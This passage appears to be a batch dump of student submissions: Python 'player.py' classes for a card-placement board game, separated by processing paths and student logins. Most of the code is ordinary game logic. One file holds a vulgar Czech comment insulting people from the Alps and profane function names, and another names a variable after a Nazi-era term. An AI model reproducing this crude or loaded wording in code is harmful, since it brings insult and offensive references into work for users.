            new_x = newCardOnDesk[1]  # column
            new_y = newCardOnDesk[0]  # row
            new_w = new_card[0].__len__()
            new_h = new_card.__len__()

            # find the card that opponent placed and remove it from his hand
            match_id = -1
            rot_id = -1
            for i in range(len(self.opponents_cards)):
                card = self.opponents_cards[i]
                for j in range(len(card.rotations)):
                    rot = card.rotations[j]
                    if match_id >= 0:
                        break

                    if rot.w == new_w and rot.h == new_h:

                        cards_matching = True
                        for x in range(new_w):
                            for y in range(new_h):
                                if new_card[y][x] != rot.cells[y][x]:
                                    cards_matching = False
                                    break
                            else:
                                continue
                            break

                        if cards_matching:
                            match_id = i
                            rot_id = j
                            break

            # remove the matched card from the opponents hand
            if match_id != -1:
                print(f"Matching opponent card found, placed and removed from hand.")
                print(f"{len(self.opponents_cards)} cards left in opponents hand.")

                opp_card = self.opponents_cards.pop(match_id)
                opp_card = opp_card.rotations[rot_id]
                opp_card.x = new_x
                opp_card.y = new_y
                
                # opponent score
                opp_score = self.my_board._get_contribution(opp_card, new_x, new_y)
                self.opponent_score += opp_score
                print(f"Opponent selected card with score {opp_score}. Total: {self.opponent_score}.")
                
                self.my_board.place_safe_SC(opp_card)
            else:
                print("!ERROR! - NO MATCHING OPPONENT CARD FOUND")
        else:
            if self.turn != 0:
                self.turn += 1

        # no cards left
        if len(self.my_cards) == 0 or len(self.cardsAtHand) == 0:
            self.turn += 1
            return []

        # Choosing logic
        best = self.my_board.select_best_card(self.my_cards)

        # first turn: place the first card in hand
        if self.turn == 0 and len(newCardOnDesk) == 0:
            # TODO: strategy on empty board
            crd = self.my_cards[0]
            best = (0, crd.rotations[0], 1, 1, crd)
            pass

        if best == None:
            self.turn += 1
            return []

        (score_gained, picked_card_rotation, x, y, picked_card_parent) = best
        picked_card_rotation.x = x
        picked_card_rotation.y = y

        # remove the picked card from my hand
        self.my_cards.remove(picked_card_parent)

        # apply the chosen card to the board
        self.my_board.place_safe_SC(picked_card_rotation)
        self.my_score += score_gained

        print(f"Card with score {score_gained} selected. Total: {self.my_score}.")
        print(f"{len(self.my_cards)} cards left in my hand.")

        end = time.time()
        print("play() took:", (end - start) * 1000, "ms")
        print("-" * 15)
        self.turn += 1
        return [y, x, picked_card_rotation.cells]


if __name__ == "__main__":
    """when you run:
    python3 player.py

    you should get set of .png files with the progress of the game
    """

    tmp = [C44a, C44b, C33a, C33c, C53c, C53b] * 1

    p1 = Player("testA", 19, 23, tmp)
    p2 = Player("testB", 19, 23, tmp)

    p2move = []
    gameStep = 0
    while True:
        p1move = p1.play(p2move)
        # print("p1 returned", p1move)
        # p1.drawCards(
        #     p1.boardRows,
        #     p1.boardCols,
        #     list(
        #         map(lambda card: (card.y, card.x, card.cells), p1.my_board.placed_cards)
        #     ),
        #     "move-{:02}b-A.png".format(gameStep),
        # )

        p2move = p2.play(p1move)
        # print("p2 returned", p2move)
        p2.drawCards(
            p2.boardRows,
            p2.boardCols,
            list(
                map(lambda card: (card.y, card.x, card.cells), p2.my_board.placed_cards)
            ),
            "move-{:02}b-B.png".format(gameStep),
        )
        gameStep += 1
        if p1move == [] and p2move == []:
            print(">> END OF GAME <<")
            quit()
    kolarpat
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/kolarpat______________________
        player.py
import base as BASE
import copy, random, time, sys, os
from PIL import Image, ImageDraw

class Coord:
    def __init__(self, x=0, y=0):
        self.x = x
        self.y = y

    def __str__(self):
        return "(" + str(self.x) + ", " + str(self.y) + ")"


class Card:
    """Representation of 1 card"""

    def __init__(self):
        self.data = []
        self.size = Coord()
        self.position = Coord()
        self.neighbours = []
        self.original_num = 0

    def __deepcopy__(self, memodict={}):
        new_copy = type(self)()
        new_copy.data = copy.deepcopy(self.data, memodict)
        new_copy.size = copy.deepcopy(self.size, memodict)
        new_copy.position = copy.deepcopy(self.position, memodict)
        new_copy.neighbours = copy.deepcopy(self.neighbours, memodict)
        new_copy.original_num = copy.deepcopy(self.original_num, memodict)
        return new_copy

    def load_from_wierd(self, data, original_num):
        self.original_num = original_num
        self.size = Coord(len(data[0]), len(data))
        for row in data:
            for element in row:
                self.data.append(element)

    def create_wierd(self, rotation=0):
        size_x = self.get_size_x(rotation)
        size_y = self.get_size_y(rotation)

        gen = card_getter(self, rotation)

        final_array = []
        for y in range(size_y):
            tmp_array = []
            for x in range(size_x):
                data = next(gen)
                tmp_array.append(data)
            final_array.append(tmp_array)
        return [self.position.y, self.position.x, final_array]




    def get_size_y(self, rotation=0):
        if rotation in [1, 3]:
            return self.size.x
        return self.size.y

    def get_size_x(self, rotation=0):
        if rotation in [1, 3]:
            return self.size.y
        return self.size.x

    def load_from_line(self, line: str, is_placed: bool):
        """return True on success, False otherwise"""
        if len(line) < 4:
            return False
        line_data = line.strip().split(" ")
        i = 0
        if is_placed:
            self.position.y = int(line_data[i])
            i += 1
            self.position.x = int(line_data[i])
            i += 1
        self.size.y = int(line_data[i])
        i += 1
        self.size.x = int(line_data[i])
        i += 1
        self.data = list(map(int, line_data[i:]))
        return True

    def __str__(self):
        return f"[{self.size.x}, {self.size.y}] OFF[{self.position.x},{self.position.y}]\nData: {self.data}\n"

    def print_solution(self, rotation: int):
        """Print in required format"""
        s = f"{self.position.y} {self.position.x} {self.get_size_y(rotation)} {self.get_size_x(rotation)}"
        for res in list(card_getter(self, rotation)):
            s += " " + str(res)
        print(s)


def card_getter(card: Card, rotation=0):  # 0-3 rotation
    """Generator of next data while baking card"""
    if rotation == 0:
        for i in range(card.size.y * card.size.x):
            yield card.data[i]

    elif rotation == 1:
        for c in range(card.size.x):
            for r in range(card.size.y - 1, -1, -1):
                yield card.data[r * card.size.x + c]

    elif rotation == 2:
        for i in range(card.size.y * card.size.x - 1, -1, -1):
            yield card.data[i]

    elif rotation == 3:
        for c in range(card.size.x - 1, -1, -1):
            for r in range(card.size.y):
                yield card.data[r * card.size.x + c]


class Board:
    """Representation of whole board"""

    def __init__(self):
        self.data = []
        self.size = Coord()
        self.cards = []
        self.prefix = []
        self.visited = []
        self.evaluated = []

    def take_input(self, file_path):
        with open(file_path, "r") as f:
            line = f.readline()
            temp = line.strip().split(" ")
            self.size.x = int(temp[1])
            self.size.y = int(temp[0])
            self.data = [-1 for x in range(self.size.x * self.size.y)]
            line = f.readline()
            temp = line.strip().split(" ")
            placed_num = int(temp[0])
            to_place_num = int(temp[1])
            for i in range(placed_num):
                line = f.readline()
                c = Card()
                if not c.load_from_line(line, True):
                    print("ERROR loading card")
                if not self.bake_card(c):
                    print("ERROR baking card")
            for i in range(to_place_num):
                line = f.readline()
                c = Card()
                if not c.load_from_line(line, False):
                    print("ERROR loading card")
                self.cards.append(c)
        self.calc_prefix()

    def calc_prefix(self):
        self.prefix = [[0 for x in range(self.size.x + 1)] for y in range(self.size.y + 1)]
        for y in range(1, self.size.y + 1):
            for x in range(1, self.size.x + 1):
                value = 0 if self.data[(y - 1) * self.size.x + x - 1] == -1 else 1
                self.prefix[y][x] = value + self.prefix[y-1][x] + self.prefix[y][x-1]
                self.prefix[y][x] -= self.prefix[y-1][x-1]

    def is_area_free(self, x1, y1, x2, y2):
        """Concept for prefix sum free space evaluation """
        # TODO fix
        area = (self.prefix[y2 + 1][x2 + 1]
        - self.prefix[y1][x2 + 1]
        - self.prefix[y2 + 1][x1]
        + self.prefix[y1][x1])
        #print(x1, y1, x2, y2, "=>", area)
        return area == 0


    def __str__(self):
        """Debug function"""
        s = "Board\n"
        top_label = str(self.size.x)
        left_label = str(self.size.y)
        total = 3 * self.size.x + 1
        half = int((total - len(top_label)) / 2)
        s += "+" + "-" * (half - 1) + top_label + "-" * (total - len(top_label) - half) + "+\n"
        for idx, symbol in enumerate(self.data):
            r = int(idx / self.size.x)
            c = int(idx % self.size.x)
            if c == 0:
                if int(self.size.y / 2) == r:
                    s += left_label + " "
                else:
                    s += "|" + " " * len(left_label)
            s += " " * (2 - len(str(symbol))) + str(symbol) + " "
            if c == self.size.x - 1:
                s += "\n"
        return s

    def print_visited(self):
        """Debug function"""
        s = "Visited\n"
        top_label = str(self.size.x)
        left_label = str(self.size.y)
        total = 3 * self.size.x + 1
        half = int((total - len(top_label)) / 2)
        s += "+" + "-" * (half - 1) + top_label + "-" * (total - len(top_label) - half) + "+\n"
        for idx, symbol in enumerate(self.visited):
            r = int(idx / self.size.x)
            c = int(idx % self.size.x)
            if c == 0:
                if int(self.size.y / 2) == r:
                    s += left_label + " "
                else:
                    s += "|" + " " * len(left_label)
            s += " " * (2 - len(str(int(symbol)))) + str(int(symbol)) + " "
            if c == self.size.x - 1:
                s += "\n"
        return s

    def run_search(self, x, y, color):
        """mark Visited, for every direction, try to continue... summ all up and return"""
        if x < 0 or x >= self.size.x or y < 0 or y >= self.size.y:
            return 0
        value = 0
        if not self.visited[y*self.size.x+x]:
            self.visited[y*self.size.x+x] = True
            if self.data[y*self.size.x+x] == color:
                if not self.evaluated[y*self.size.x+x]:
                    self.evaluated[y*self.size.x+x] = True
                    value = 1
                    for dx, dy in [(0, 1), (0, -1), (1, 0), (-1, 0)]:
                        value += self.run_search(x+dx, y+dy, color)
        return value

    def evaluate_paths(self, card: Card, rotation: int):
        """return sum of all connected components (using DFS search),
         while marking already visited and evaluated states"""


        self.evaluated = [False for _ in range(self.size.y * self.size.x)]
        count = 0

        for n in card.neighbours:
            self.visited = [False for _ in range(self.size.y * self.size.x)]
            idx_board = (n.y + card.position.y) * self.size.x + n.x + card.position.x
            temp = self.run_search(n.x + card.position.x, n.y + card.position.y, self.data[idx_board])
            if temp > 1:
                count += temp

        return count

    def bake_card(self, card: Card):
        """directly print card into data without rotation"""
        board_len = self.size.x * self.size.y
        card_len = len(card.data)
        for y in range(card.size.y):
            for x in range(card.size.x):
                idx_board = (y + card.position.y) * self.size.x + x + card.position.x
                idx_card = y * card.size.x + x
                if 0 <= idx_board < board_len and 0 <= idx_card < card_len:
                    self.data[idx_board] = card.data[idx_card]
                else:
                    print("ERROR index in baking")
        return True

    def unbake_card(self, card: Card, rotation=0):
        """replace -1 everywhere the card is (or should be)"""
        board_len = self.size.x * self.size.y
        card_size = Coord(card.get_size_x(rotation), card.get_size_y(rotation))
        for y in range(card_size.y):
            for x in range(card_size.x):
                idx_board = (y + card.position.y) * self.size.x + x + card.position.x
                if not (0 <= idx_board < board_len):
                    print("ERROR index in baking")
                    return False
                self.data[idx_board] = -1
        return True

    def safe_place(self, card: Card, rotation=0):
        """
        Add data from card into board
        rotation: [0-3] => [0, 90, 180, 270] deg
        position: x,y on board where will be placed Top-Left corner of card (rotate afterward)
        Start placing number until it can't, then revert on fail.
        On success return with card neighbours to evaluate score.
        :return True on success, False on unwanted behavior (overlaping cards, out of board)
        """

        board_len = self.size.x * self.size.y
        gen = card_getter(card, rotation)
        revert = False
        connected = False
        card_size = Coord(card.get_size_x(rotation), card.get_size_y(rotation))
        counter = 0
        card.neighbours = []
        for y in range(card_size.y):
            for x in range(card_size.x):

                idx_board = (y + card.position.y) * self.size.x + x + card.position.x

                if not (0 <= idx_board < board_len):
                    print("ERROR index in baking")
                    revert = True
                    break
                if self.data[idx_board] != -1:
                    revert = True
                    break
                next_data = next(gen)

                if 0 <= counter < card_size.x:  # top
                    temp_idx = (y - 1 + card.position.y) * self.size.x + x + card.position.x
                    if 0 <= temp_idx < board_len:
                        if self.data[temp_idx] != -1:
                            connected = True
                            if self.data[temp_idx] == next_data and next_data > 0:
                                card.neighbours.append(Coord(x, y))

                if (card_size.y - 1) * card_size.x <= counter < card_size.x * card_size.y:  # bottom
                    temp_idx = (y + 1 + card.position.y) * self.size.x + x + card.position.x
                    if 0 <= temp_idx < board_len:
                        if self.data[temp_idx] != -1:
                            connected = True
                            if self.data[temp_idx] == next_data and next_data > 0:
                                card.neighbours.append(Coord(x, y))
                if counter % card_size.x == 0:  # left
                    temp_idx = (y + card.position.y) * self.size.x + x + card.position.x - 1
                    if 0 <= temp_idx < board_len and 0 <= x + card.position.x - 1 < self.size.x:
                        if self.data[temp_idx] != -1:
                            connected = True
                            if self.data[temp_idx] == next_data and next_data > 0:
                                card.neighbours.append(Coord(x, y))
                if counter % card_size.x == card_size.x - 1:  # right
                    temp_idx = (y + card.position.y) * self.size.x + x + card.position.x + 1
                    if 0 <= temp_idx < board_len and 0 <= x + card.position.x + 1 < self.size.x:
                        if self.data[temp_idx] != -1:
                            connected = True
                            if self.data[temp_idx] == next_data and next_data > 0:
                                card.neighbours.append(Coord(x, y))

                self.data[idx_board] = next_data
                counter += 1
            if revert:
                break

        if revert or not connected:
            for yr in range(card_size.y):
                for xr in range(card_size.x):
                    if counter == 0:
                        return False
                    idx_board = (yr + card.position.y) * self.size.x + xr + card.position.x
                    self.data[idx_board] = -1
                    counter -= 1
            return False

        return True

    def can_neighbor(self, index, symbol2):
        if self.data[index] == symbol2:
            return True
        if self.data[index] <= 0 or symbol2 <= 0:
            return True
        return False

    def place_cards(self):
        """
        try every rotation, possible position
        prefix sum matrix is used to determine free area (its faster)
        find the largest connected components are return best
        """
        best_match = (None, 0) # Card, rotation
        best_score = -1

        for card in self.cards:
            for rotation in [0, 1, 2, 3]:
                for x in range(0, self.size.x - card.get_size_x(rotation) + 1):
                    for y in range(0, self.size.y - card.get_size_y(rotation) + 1):

                        card.position.x = x
                        card.position.y = y
                        # TODO fix prefix area
                        # if self.is_area_free(x, y, x + card.get_size_x(rotation), y + card.get_size_y(rotation)):
                        if self.safe_place(card, rotation):
                            current = self.evaluate_paths(card, rotation)
                            if current > best_score:
                                best_score = current
                                best_match = copy.deepcopy(card), rotation
                            self.unbake_card(card, rotation)

        return best_match


class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "HW08 player"

        self.board = Board()
        self.board.size = Coord(self.boardCols, self.boardRows)
        self.board.data = [-1 for x in range(self.board.size.x * self.board.size.y)]
        self.turn = 0


    def play(self, newCardOnDesk):
        """ this method is called during the game. 
            The input argument newCardOnDesk is:
            - [] if other player didn't place any card in his move), or
            - [row, col, cardMatrix], which informs your player that cardMatrix was placed at row,col to the game board
            
            Return value: 
            - [ row, col, cardMatrix ] if you want to place a card, or
            - [] if no card can be placed 
        """

        # recommended steps
        # step 0: write newCardOnDesk to list of cards that are on the board game
        # step 1: compute all possible placement of your all (so for available) cards
        # step 2: evaluate each placement, i.e., compute score for it
        # step 3: select card that you want to place to the game board, mark it as used (not available in future)
        # step 4: return your placement, or [] if no placement can be made

        self.turn += 1
        if self.turn == 1 and not newCardOnDesk:
            cardindx = random.randint(0, len(self.cardsAtHand) - 1)  # random index of a card
            card = self.cardsAtHand[cardindx]
            cardRows = len(card)
            cardCols = len(card[0])
            row = random.randint(0, self.boardRows - cardRows - 1)
            col = random.randint(0, self.boardCols - cardCols - 1)
            self.cardsAtHand = self.cardsAtHand[:cardindx] + self.cardsAtHand[cardindx + 1:]

            usable_cards = []
            for i, card_data in enumerate(self.cardsAtHand):
                card_i = Card()
                card_i.load_from_wierd(card_data, i)
                usable_cards.append(card_i)
            self.board.cards = usable_cards

            final_card = Card()
            final_card.position = Coord(col, row)
            final_card.load_from_wierd(card, -1)

            self.board.bake_card(final_card)
            self.cardsOnDesk += [[row, col, card]]
            return [row, col, card]

        if self.turn == 1 and newCardOnDesk:
            usable_cards = []
            for i, card_data in enumerate(self.cardsAtHand):
                card_i = Card()
                card_i.load_from_wierd(card_data, i)
                usable_cards.append(card_i)
            self.board.cards = usable_cards

        if newCardOnDesk:
            card = Card()
            card.load_from_wierd(newCardOnDesk[2], -1)
            card.position = Coord(newCardOnDesk[1], newCardOnDesk[0])
            self.board.bake_card(card)
            self.cardsOnDesk += [newCardOnDesk]

        if not self.board.cards:
            return []

        best_card, best_rotation = self.board.place_cards()
        if not best_card:
            return []
        for card in self.board.cards:
            if card.original_num == best_card.original_num:
                self.board.cards.remove(card)
                break

        self.board.safe_place(best_card, best_rotation)


        res = best_card.create_wierd(best_rotation)
        self.cardsOnDesk += [res]
        return res


if __name__ == "__main__":
    """ when you run:
        python3 player.py

        you should get set of .png files with the progress of the game
    """

    # basic cards with colors 1 and 2
    # note that Brute can provide you also other cards!
    C44a = [[0, 1, 2, 0],
            [1, 1, 2, 2],
            [2, 2, 1, 1],
            [0, 2, 1, 0]]

    C44b = [[0, 0, 1, 0],
            [1, 1, 1, 0],
            [0, 2, 2, 2],
            [0, 2, 0, 0]]

    C53b = [[0, 1, 0],
            [0, 1, 0],
            [0, 1, 0],
            [0, 1, 1],
            [0, 0, 0]]

    C53c = [[0, 1, 0],
            [0, 1, 0],
            [0, 1, 1],
            [0, 2, 2],
            [0, 2, 0]]

    C33a = [[0, 1, 0],
            [1, 1, 2],
            [0, 0, 2]]

    C33c = [[1, 2, 1],
            [2, 2, 2],
            [1, 2, 1]]

    tmp = [C44a, C44b, C33a, C33c, C53c, C53b] * 1

    p1 = Player("testA", 19, 23, tmp)
    p2 = Player("testB", 19, 23, tmp)

    p2move = []
    gameStep = 0
    while True:
        p1move = p1.play(p2move)
        print("p1 returned", p1move)
        p1.drawCards(p1.boardRows, p1.boardCols, p1.cardsOnDesk, "move-{:02}b-A.png".format(gameStep))
        p2move = p2.play(p1move)
        print("p2 returned", p2move)
        p2.drawCards(p2.boardRows, p2.boardCols, p2.cardsOnDesk, "move-{:02}b-B.png".format(gameStep))
        gameStep += 1
        if p1move == [] and p2move == []:
            print("end of game")

            quit()
    vosahda2
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/vosahda2______________________
        player.py
An error occurred: 'ascii' codec can't decode byte 0xc3 in position 4233: ordinal not in range(128)    kahovpe1
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/kahovpe1______________________
        player.py
import base as BASE
import copy, random, time, sys, os
from PIL import Image, ImageDraw


#basic cards with colors 1 and 2
#note that Brute can provide you also other cards!
C44a = [ [0,1,2,0], 
         [1,1,2,2],
         [2,2,1,1],
         [0,2,1,0] ]  

C44b = [ [0,0,1,0], 
         [1,1,1,0],
         [0,2,2,2],
         [0,2,0,0] ] 

C53b = [ [0,1,0], 
         [0,1,0],
         [0,1,0],
         [0,1,1],
         [0,0,0] ]

C53c = [ [0,1,0], 
         [0,1,0],
         [0,1,1],
         [0,2,2],
         [0,2,0] ]

C33a = [ [0,1,0], 
         [1,1,2],
         [0,0,2] ]

C33c = [ [1,2,1], 
         [2,2,2], 
         [1,2,1] ]

class Player(BASE.BasePlayer):
    cardindx = 0
    card=0
    cur_max = -1
    max_card = 0
    max_x = 0
    max_y = 0

    def prevod(self,prev):
        r=[]
        for i in range(len(prev)):
            pole=[len(prev[i]),len(prev[i][0])]
            for row in range(pole[0]):
                for col in range(pole[1]):
                    pole.append(prev[i][row][col])
            r.append(pole)
        return r


    
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.cards_in_play=[]
        self.board = []
        self.playerName = "pan Mah Oyakotic"
        for _ in range(boardRows):
            self.board.append(boardCols*['x'])
        self.cardsAtHand=self.prevod(self.cardsAtHand)
        #print(self.cardsAtHand)



    """"rotace"""
    def rotate(card,angle):
        index = 0
        rotated_card=card[:]
        if angle!= 0:
            rotated_card[0],rotated_card[1] = card[1],card[0]#radky x sloupce
            for j in range(card[1]):
                for i in range(card[0]):
                    rotated_card[2+i+j*card[0]] = card[2+j+card[1]*(card[0]-(i+1))]
            index+=1
        return rotated_card
    """rotace"""

    """flood fill"""
    def flood_fill(m,x_in,y_in,h,card,x_out,y_out):#x radek,y sloupec
        score=1
        ti=0
        pole=[(x_in,y_in)]
        m[y_in][x_in] = '0'
        while len(pole)>0:
            x,y=pole.pop()#pro frontu pop(0)
            if x>=card[1]+x_out or y>=card[0]+y_out or x<x_out or y<y_out:
                ti=1
            if x+1<len(m[0]):
                if m[y][x+1]==h:
                    m[y][x+1] = '0'
                    score+=1
                    pole.append((x+1,y))
            if y+1<len(m):
                if m[y+1][x]==h:
                    m[y+1][x] = '0'
                    score+=1
                    pole.append((x,y+1))
            if x-1>=0:
                if m[y][x-1]==h:
                    m[y][x-1] = '0'
                    score+=1
                    pole.append((x-1,y))
            if y-1>=0:
                if m[y-1][x]==h:
                    m[y-1][x] = '0'
                    score+=1
                    pole.append((x,y-1))
        return ti*score
    """flood fill"""

    """vypocet skore po vlozeni nove karty na hraci pole"""
    def rank(map,placed_card,y,x):
        score=[]
        for row in range(placed_card[0]):
            for col in range(placed_card[1]):
                if map[row+y][col+x]!='0':
                    score.append(Player.flood_fill(map,col+x,row+y,str(map[row+y][col+x]),placed_card,x,y))
        return sum(score)
    """vypocet skore po vlozeni nove karty na hraci pole"""

    """uz me ty curaci z alp kurva serou"""
    def printer(matrix):
        for row in range(len(matrix)):
            print(matrix[row])


    """test korektnosti tahu"""
    def test(self,coord_x,coord_y,card_to_place,map):
        #global cur_max
        #global max_card
        #global max_x
        #global max_y
        new_map = copy.deepcopy(map)
        for row in range(card_to_place[0]):
            for col in range(card_to_place[1]):
                if coord_y+row>=self.boardRows or coord_x+col>=self.boardCols or (map[coord_y+row][coord_x+col]!='x' and map[coord_y+row][coord_x+col]!='k'):
                    #print("gg")
                    return -1
                new_map[coord_y+row][coord_x+col] = str(card_to_place[2+row*card_to_place[1]+col])
        calc = Player.rank(new_map,card_to_place,coord_y,coord_x)
        #print("sfsg")
        if calc > self.cur_max:
            self.cardindx=self.card
            self.cur_max = calc
            self.max_card = card_to_place
            self.max_x = coord_x
            self.max_y = coord_y
    """test korektnosti tahu"""

    """hledani hratelne pozice"""
    def find_move(self,map,placed_cards,card_in_hand):
        #print(placed_cards)
        #Player.printer(map)
        for card in range(len(placed_cards)):
            #print("idk")
            for row in range(placed_cards[card][2]+card_in_hand[0]-1):
                #print("wtf")
                if row+placed_cards[card][0]-card_in_hand[0]+1>=0 and placed_cards[card][1]+placed_cards[card][3]<self.boardCols and (map[row+placed_cards[card][0]-card_in_hand[0]+1][placed_cards[card][1]+placed_cards[card][3]]=='x'):
                    #map[row+placed_cards[card][0]-card_in_hand[0]+1][placed_cards[card][1]+placed_cards[card][3]]='k'#prava vertikalni,vypada ze funguje
                    Player.test(self,placed_cards[card][1]+placed_cards[card][3],row+placed_cards[card][0]-card_in_hand[0]+1,card_in_hand,map)
                    #map[row+placed_cards[card][0]-card_in_hand[0]+1][placed_cards[card][1]+placed_cards[card][3]]='x'#prava vertikalni,vypada ze funguje

                if row+placed_cards[card][0]-card_in_hand[0]+1>=0 and placed_cards[card][1]-card_in_hand[1]>=0 and (map[row+placed_cards[card][0]-card_in_hand[0]+1][placed_cards[card][1]-card_in_hand[1]]=='x'):#leva vertikalni, asi ok
                    #map[row+placed_cards[card][0]-card_in_hand[0]+1][placed_cards[card][1]-card_in_hand[1]]='k'
                    Player.test(self,placed_cards[card][1]-card_in_hand[1],row+placed_cards[card][0]-card_in_hand[0]+1,card_in_hand,map)
                    #map[row+placed_cards[card][0]-card_in_hand[0]+1][placed_cards[card][1]-card_in_hand[1]]='x'

            for col in range(placed_cards[card][3]+card_in_hand[1]):
                if placed_cards[card][0]-card_in_hand[0]>=0 and -col+placed_cards[card][1]+placed_cards[card][3]-1>=0 and (map[placed_cards[card][0]-card_in_hand[0]][-col+placed_cards[card][1]+placed_cards[card][3]-1]=='x'):
                    #map[placed_cards[card][0]-card_in_hand[0]][-col+placed_cards[card][1]+placed_cards[card][3]-1]='k'
                    Player.test(self,-col+placed_cards[card][1]+placed_cards[card][3]-1,placed_cards[card][0]-card_in_hand[0],card_in_hand,map)
                    #map[placed_cards[card][0]-card_in_hand[0]][-col+placed_cards[card][1]+placed_cards[card][3]-1]='x'

                if placed_cards[card][0]+placed_cards[card][2]<self.boardRows and -col+placed_cards[card][1]+placed_cards[card][3]-1>=0 and (map[placed_cards[card][0]+placed_cards[card][2]][-col+placed_cards[card][1]+placed_cards[card][3]-1]=='x'):
                    #map[placed_cards[card][0]+placed_cards[card][2]][-col+placed_cards[card][1]+placed_cards[card][3]-1]='k'
                    Player.test(self,-col+placed_cards[card][1]+placed_cards[card][3]-1,placed_cards[card][0]+placed_cards[card][2],card_in_hand,map)
                    #map[placed_cards[card][0]+placed_cards[card][2]][-col+placed_cards[card][1]+placed_cards[card][3]-1]='x'

        return map
    """hledani hratelne pozice"""

    """pridani zahrane karty na hraci pole"""
    def setup_board(self,card_to_place,map):
        index=0
        #print(card_to_place)
        for row in range(card_to_place[2]):
            col=0
            for col in range(card_to_place[3]):
                map[card_to_place[0]+row][card_to_place[1]+col]=str(card_to_place[index+4])
                index+=1
        return map
    """pridani zahrane karty na hraci pole"""

    def jebe(pole):
        pole1=[]
        for i in range(len(pole)):
            pole1=pole1+pole[i]
        return pole1

    def inverze_jebe(pole):
        pole1=[]
        for row in range(pole[0]):
            pole1.append(pole[row*(pole[1])+2:2+pole[1]*(row+1)])
        return pole1

    def play(self,newCardOnDesk):
        """ this method is called during the game. 
            The input argument newCardOnDesk is:
            - [] if other player didn't place any card in his move), or
            - [row, col, cardMatrix], which informs your player that cardMatrix was placed at row,col to the game board
            
            Return value: 
            - [ row, col, cardMatrix ] if you want to place a card, or
            - [] if no card can be placed 
        """
        #print(newCardOnDesk[0])
        #Player.printer(self.board)
        """self.cardindx = 0
        self.card=0
        self.cur_max = -1
        self.max_card = 0
        self.max_x = 0
        self.max_y = 0"""
        if len(self.cardsAtHand)==0:
            return []
        if len(self.cards_in_play)==0 and newCardOnDesk==[]:
            self.board=Player.setup_board(self,[0,0]+self.cardsAtHand[self.cardindx],self.board)
            #Player.printer(self.board)
            k=self.cardsAtHand[self.cardindx]
            self.cardsAtHand = self.cardsAtHand[:self.cardindx] + self.cardsAtHand[self.cardindx+1:]
            #print(k)
            #print(Player.inverze_jebe(k))
            self.cards_in_play.append([self.max_y]+[self.max_x]+k)#x,y,r,c
            return [self.max_y, self.max_x, Player.inverze_jebe(k) ]#prohozeny x a y
        if len(newCardOnDesk) == 3:
            #karta= [newCardOnDesk[0]]+[newCardOnDesk[1]]+newCardOnDesk[2]#prepsat
            #print(newCardOnDesk)
            karta=[newCardOnDesk[0]]+[newCardOnDesk[1]]+[len(newCardOnDesk[2])]+[len(newCardOnDesk[2][0])]+Player.jebe(newCardOnDesk[2])
            #print(karta)
            self.board = Player.setup_board(self,karta,self.board)
            self.cards_in_play.append(karta) 
            #Player.printer(self.board)
            #print(self.cards_in_play)
        #self.card=0
        #print(len(self.cardsAtHand))
        for self.card in range(len(self.cardsAtHand)):
            for angle in range(4):
                #print(self.cardsAtHand)
                self.cardsAtHand[self.card] = Player.rotate(self.cardsAtHand[self.card],min(90,angle*100))
                Player.find_move(self,self.board,self.cards_in_play,self.cardsAtHand[self.card])
        if self.cur_max == -1:
            #print("NOSOLUTION")
            return []
        else:
            #print("ok")
            self.board=Player.setup_board(self,[self.max_y,self.max_x]+self.max_card,self.board)
            #Player.printer(self.board)
            #print(self.cardsAtHand[self.cardindx])
            self.cardsAtHand = self.cardsAtHand[:self.cardindx] + self.cardsAtHand[self.cardindx+1:]
            self.cards_in_play.append([self.max_y]+[self.max_x]+self.max_card)#x,x,r,c
            print(self.max_card)
            #self.cardsAtHand.pop(self.cardindx)
            #print(self.cardsAtHand)
            #print(self.max_card)
            #Player.printer(self.board)
            self.cur_max=-1
            return [self.max_y, self.max_x, Player.inverze_jebe(self.max_card) ]#prohozeni x a y








        #recommened steps 
        #step 0: write newCardOnDesk to list of cards that are on the board game
        #step 1: compute all possible placement of your all (so for available) cards
        #step 2: evaluate each placement, i.e., compute score for it
        #step 3: select card that you want to place to the game board, mark it as used (not available in future)
        #step 4: return your placement, or [] if no placement can be made
        #the following code DOES NOT provides correct moves, 
        #it just return random card at random position
        
"""
        if len(newCardOnDesk) == 3:
            self.cardsOnDesk += [ newCardOnDesk ]

        if len(self.cardsAtHand) == 0:
            return []

        cardindx = random.randint(0, len(self.cardsAtHand)-1)  #random index of a card
        card = self.cardsAtHand[cardindx]#ok
        cardRows = len(card)#ok
        cardCols = len(card[0])#ok
        row = random.randint(0, self.boardRows-cardRows-1)#ok 
        col = random.randint(0, self.boardCols-cardCols-1)#ok
        self.cardsAtHand = self.cardsAtHand[:cardindx] + self.cardsAtHand[cardindx+1:]  #remove selected card so its not used in future
        self.cardsOnDesk += [ [row, col, card ] ]#ok
        return [row, col, card ]#ok
"""

"""to dalsi asi nezajem mel by to bejt totiz zobrazovac hry"""
if __name__ == "__main__":
    """ when you run:
        python3 player.py

        you should get set of .png files with the progress of the game
    """

    tmp = [C44a, C44b, C33a,C33c, C53c, C53b]*1

    p1 = Player("testA", 19, 23, tmp)
    p2 = Player("testB", 19, 23, tmp)

    p2move = []
    gameStep = 0
    while True:
        p1move = p1.play(p2move)
        print("p1 returned", p1move)
        p1.drawCards(p1.boardRows, p1.boardCols, p1.cardsOnDesk,"move-{:02}b-A.png".format(gameStep))

        p2move = p2.play(p1move)    
        print("p2 returned", p2move)
        p2.drawCards(p2.boardRows, p2.boardCols, p2.cardsOnDesk,"move-{:02}b-B.png".format(gameStep))
        gameStep += 1
        if p1move == [] and p2move == []:
            print("end of game")
            quit()


    vorelja5
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/vorelja5______________________
        player.py
import base as BASE

class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "rekurshon"
        self.volksgemeinschaft = [[-1 for _ in range(self.boardCols)] for _ in range(self.boardRows)]
        self.started = False

    def play(self, newCardOnDesk):
        if len(newCardOnDesk) == 3:
            self.cardsOnDesk += [ newCardOnDesk ]
            for r in range(len(newCardOnDesk[2])):
